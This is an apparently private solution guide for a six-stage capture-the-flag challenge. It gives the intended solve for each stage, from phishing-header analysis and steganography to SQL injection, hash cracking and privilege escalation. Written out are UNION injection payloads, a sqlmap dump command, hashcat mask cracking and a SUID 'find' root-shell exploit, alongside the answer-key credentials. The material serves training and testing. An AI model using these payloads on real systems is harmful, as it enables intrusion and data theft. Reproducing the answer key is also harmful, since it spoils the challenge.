# Challenge build & intended solves (S1–S3, S5)

**Private — keep this repo private; this file documents the solution path.**

## Build order

```bash
python3 scripts/gen_flags.py       # mint flags -> challenges/.flags.json (git-ignored)
python3 scripts/gen_artifacts.py   # S1 eml, S3 pcap, S5 dump+wordlist, S4 seed/init.sql, S2 cover+payload
scripts/embed_s2.sh                # OpenStego embed -> challenges/s2/network_diagram.png
```

Flags to configure in CTFd (case-sensitive) are printed by `gen_flags.py` and
saved to `flags.local`. Re-running `gen_flags.py` rotates all tokens, so re-run
`gen_artifacts.py` + `embed_s2.sh` afterwards to keep artefacts in sync.

Every generated artefact is git-ignored (they contain flags/answers); only the
generators are committed. All four static stages were solve-verified during the
build (see `docs/test-results.md` once Step 10 records the full matrix).

## Intended solves

**S1 — lure.eml.** Inspect headers (look-alike sender `ceylonpay-secure.lk`,
`Reply-To` mismatch, external `Received`/`X-Originating-IP`) to spot the phish;
body gives the staging URL and next filename; the base64 "verification
signature" decodes (`base64 -d`) to the S1 flag + hand-off.
→ hands off: `http://staging.ceylonpay.lk`, `network_diagram.png`.

**S2 — network_diagram.png.** `exiftool` shows operator `k.fernando` in the PNG
metadata; OpenStego extract (RandomLSB) recovers the embedded blueprint note
with the internal host and the S2 flag. (steghide can't read PNG — OpenStego is
required.)
→ hands off: `k.fernando`, `api-internal.ceylonpay.lk`.

**S3 — capture.pcap.** Wireshark "Follow HTTP Stream" (or `tshark`) on the TCP
conversation shows the `POST /api/v1/login` with `k.fernando:Ceyl0nPay#2024`
(zero, not O) and the S3 flag in the `X-Debug-Token` response header.
→ hands off: `/api/v1/login`, `k.fernando : Ceyl0nPay#2024`.

**S4 — vulnerable web app (`s4_web` + `s4_db`).** Log in at the portal with the
S3 credential, then exploit the UNION-based SQL injection in the `username`
field of `POST /api/v1/login` (query has 3 columns: `id, username, role`).
- Dump the users table (the S5 hand-off):
  `zzz' UNION SELECT id, CONCAT(username,0x3a,password), role FROM users-- -`
- Read the flag from the `secrets` table:
  `zzz' UNION SELECT id, value, name FROM secrets-- -`
- Or automate with sqlmap: `sqlmap -u http://<host>:8004/api/v1/login --method=POST
  --data='{"username":"zzz","password":"x"}' --headers="Content-Type: application/json"
  -p username --technique=U -D ceylonpay_app -T secrets --dump`
→ hands off: the `users` table dump (unsalted MD5) into S5.

**S5 — users_dump.txt.** Unsalted MD5s. `svc-deploy` cracks with the supplied
`s5_wordlist.txt` to `Bl@ckout#Deploy1` (the S6 SSH password). `vault-service`
cracks with a 6-hex mask (`hashcat -a 3 -m 0 ... ?h?h?h?h?h?h`, or John
`--mask`) to the S5 token; wrap it as `CPAY{S5_vault_<token>}`.
→ hands off: `svc-deploy : Bl@ckout#Deploy1`.

**S6 — vulnerable Linux/SSH box (`s6_linux`).** SSH in with the S5 credential:
`ssh svc-deploy@<host> -p 2226`. Enumerate (manually or with linpeas) and find
the SUID-root `find`:  `find / -perm -4000 -type f 2>/dev/null` lists it. Exploit
it (GTFOBins) to become root and read the flag:
```
find . -exec /bin/sh -p \; -quit      # euid-root shell
cat /root/flag.txt                     # CPAY{S6_root_...}
```
This is the capstone — no further hand-off.

## Tooling notes
- S2 embedding needs OpenStego (Java). The build machine's OpenStego version
  produces the box's `network_diagram.png`; participants extract with the same
  tool.
- S5 `svc-deploy` is deterministically crackable because the themed wordlist
  includes the real password; decoy accounts (rockyou-style) add noise.
